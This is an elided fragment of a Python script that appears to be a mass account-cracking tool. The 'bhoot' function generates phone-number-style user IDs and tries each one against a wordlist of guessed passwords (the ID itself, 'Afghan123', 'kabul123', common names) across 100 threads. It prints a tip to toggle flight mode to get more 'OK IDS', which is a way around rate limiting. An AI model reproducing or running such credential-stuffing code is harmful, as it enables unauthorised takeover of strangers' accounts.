...
def bhoot():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=100) as TANIM:
        tl = str(len(user))
        print('\x1b[38;5;155m[➤] \x1b[38;5;222mUSE FLIGHT MOD AFTER 2 MINUTES GET MORE OK IDS <>~~~');linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'Afghan123','Afghanistan','afghan12345', 'afghanistan', 'afghan1234', ' kabul123', '۱۲۳۴۵۶','khan123','bangladesh','free fire','i love you','sadiya','mimmim','mababa','sarmin','riya123','yousha','sabbir','mehedi','tonmoy','ayesha','fuckyou','tammana','nishat']
            ids = code+love
